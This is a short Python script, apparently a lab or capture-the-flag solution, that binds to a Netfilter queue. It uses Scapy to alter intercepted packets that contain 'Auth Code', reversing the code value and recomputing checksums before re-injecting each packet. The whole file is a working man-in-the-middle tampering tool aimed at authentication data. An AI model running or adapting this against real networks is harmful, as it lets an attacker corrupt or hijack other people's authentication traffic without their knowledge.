from netfilterqueue import NetfilterQueue
from scapy.all import *

def print_and_accept(raw_pkt):
	if 'Auth Code' in raw_pkt.get_payload():
		pkt = IP(raw_pkt.get_payload())
		index = pkt[Raw].load.find('Auth Code: ')
                pkt[Raw].load = pkt[Raw].load[:index+len('Auth Code: ')] + pkt[Raw].load[index+len('Auth Code: '):][::-1]
		del pkt[IP].len
		del pkt[IP].chksum
		del pkt[TCP].chksum
		raw_pkt.set_payload(str(pkt))
	raw_pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print

